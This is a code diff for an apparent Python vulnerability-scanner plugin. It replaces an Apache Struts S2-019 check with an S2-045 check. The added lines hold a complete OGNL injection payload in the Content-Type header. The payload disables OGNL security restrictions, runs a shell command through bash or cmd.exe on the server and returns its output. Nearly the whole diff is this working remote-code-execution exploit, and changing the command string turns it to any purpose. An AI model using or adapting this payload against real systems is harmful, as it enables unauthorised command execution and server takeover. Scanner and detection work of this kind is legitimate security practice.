@@ -3,6 +3,10 @@
 # from ..t import T
 from t import T
 import requests
+import urllib2
+import sys
+from poster.encode import multipart_encode
+from poster.streaminghttp import register_openers
 class P(T):
     def __init__(self):
         T.__init__(self)
@@ -25,15 +29,19 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
-        payload = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
+        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 
         #print target_url
         try:
-            headers = {"Content-Type":"application/x-www-form-urlencoded"}
+            register_openers()
+            datagen, headers = multipart_encode({"image1": open("tmp/tmp.txt", "rb")})
+            headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+            headers['Content-Type'] = payload
             if productname.has_key('cookie'):
                 headers['Cookie'] = productname['cookie']
-            r = requests.post(target_url,data=payload,headers=headers,timeout=5)
-            res_html = r.text
+            req = urllib2.Request(target_url, datagen, headers=headers)
+            r = urllib2.urlopen(req)
+            res_html = r.read()
         except Exception,e:
             print e
             return result
@@ -42,13 +50,13 @@ class P(T):
                 res.close()
                 del res
                 
-        if res_html.find("88888887") <> -1:
+        if res_html.find("127.0.0.1") <> -1:
       
 
-            info = target_url + "struts019 Vul"
+            info = target_url + "struts045 Vul"
             result['result']=True
             result['VerifyInfo'] = {}
-            result['VerifyInfo']['type']='struts019 Vul'
+            result['VerifyInfo']['type']='struts045 Vul'
             result['VerifyInfo']['URL'] =target_url
             result['VerifyInfo']['payload']=payload
             result['VerifyInfo']['result'] =info
